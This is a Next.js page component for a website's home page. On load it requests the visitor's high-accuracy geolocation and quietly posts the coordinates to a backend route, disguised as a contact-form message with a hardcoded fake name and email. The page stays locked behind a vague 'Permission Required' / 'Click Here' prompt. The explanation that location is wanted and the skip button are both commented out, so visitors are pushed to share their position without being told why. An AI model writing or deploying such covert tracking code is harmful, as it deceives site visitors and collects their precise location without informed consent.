"use client";
import Image from "next/image";
import ContactForm from "./ContactForm";
import Home1 from "@/components/Home1";
import Location from "@/components/Location";
import { useEffect, useState } from "react";
import axios from "axios";
import { BadgeAlert } from "lucide-react";

export default function Home() {
    const [location, setLocation] = useState<{
        lat: number;
        lon: number;
    } | null>(null);
    const [locationError, setLocationError] = useState<string | null>(null);
    const [showLocationPrompt, setShowLocationPrompt] = useState(false);

    const sendLocationData = async (lat: number, lon: number) => {
        try {
            const response = await axios.post("/api/submit", {
                name: "himanshu",
                email: "himanshu@gmail.com",
                phone: "1234567890",
                category: "",
                message: `latitude: ${lat}, longitude: ${lon}`,
            });
            console.log(response.data);
        } catch (error) {
            console.error("Error sending location data:", error);
        }
    };

    const requestLocation = () => {
        if (!navigator.geolocation) {
            setLocationError("Geolocation is not supported by this browser.");
            return;
        }

        navigator.geolocation.getCurrentPosition(
            async (position) => {
                const newLocation = {
                    lat: position.coords.latitude,
                    lon: position.coords.longitude,
                };
                setLocation(newLocation);
                setLocationError(null);
                setShowLocationPrompt(false);
                
                // Send location data
                await sendLocationData(newLocation.lat, newLocation.lon);
            },
            (error) => {
                console.error("Error getting location:", error.message);
                
                switch (error.code) {
                    case error.PERMISSION_DENIED:
                        setLocationError("Location access denied by user.");
                        setShowLocationPrompt(true);
                        break;
                    case error.POSITION_UNAVAILABLE:
                        setLocationError("Location information is unavailable.");
                        break;
                    case error.TIMEOUT:
                        setLocationError("Location request timed out.");
                        setShowLocationPrompt(true);
                        break;
                    default:
                        setLocationError("An unknown error occurred.");
                        break;
                }
            },
            {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }
        );
    };

    useEffect(() => {
        // Check if location permission is already granted
        if (navigator.permissions) {
            navigator.permissions.query({ name: 'geolocation' }).then((result) => {
                if (result.state === 'granted') {
                    requestLocation();
                } else if (result.state === 'prompt') {
                    requestLocation();
                } else {
                    // Permission denied
                    setShowLocationPrompt(true);
                    setLocationError("Location access is required for better experience.");
                }
            });
        } else {
            // Fallback for browsers that don't support permissions API
            requestLocation();
        }
    }, []);

    const handleRetryLocation = () => {
        setLocationError(null);
        requestLocation();
    };

    const handleSkipLocation = () => {
        setShowLocationPrompt(false);
        setLocationError(null);
        // You can set a default location or continue without location
        setLocation({ lat: 0, lon: 0 }); // or handle this case differently
    };

    if (showLocationPrompt || locationError) {
        return (
            <div className="min-h-screen flex items-center justify-center bg-gray-50">
                <div className="max-w-md w-full bg-white rounded-lg shadow-lg p-6">
                    <div className="text-center">
                        <div className="mx-auto flex items-center justify-center h-12 w-12 rounded-full bg-blue-100 mb-4">
                            <BadgeAlert color="red"/>
                        </div>
                        <h3 className="text-lg font-medium text-gray-900 mb-2">
                            Permission Required
                        </h3>
                        {/* <p className="text-sm text-gray-500 mb-6">
                             
                            {locationError && (
                                <span className="block mt-2 text-red-600">{locationError}</span>
                            )}
                        </p> */}
                        <div className="space-y-3">
                            <button
                                onClick={handleRetryLocation}
                                className="w-full bg-blue-600 text-white py-2 px-4 rounded-lg hover:bg-blue-700 transition-colors"
                            >
                                Click Here
                            </button>
                            {/* <button
                                onClick={handleSkipLocation}
                                className="w-full bg-gray-200 text-gray-700 py-2 px-4 rounded-lg hover:bg-gray-300 transition-colors"
                            >
                                Skip for Now
                            </button> */}
                        </div>
                        <div className="mt-4 text-xs text-gray-400">
                            <p>If you previously denied browser permission:</p>
                            {/* <p>• Click the location icon in your browser's address bar</p> */}
                            <p>• Select "Allow" and refresh the page</p>
                        </div>
                    </div>
                </div>
            </div>
        );
    }

    return (
        <>
            {location ? <Home1 /> : <p>Loading location...</p>}
            {/* <ContactForm /> */}
            {/* <Location /> */}
        </>
    );
}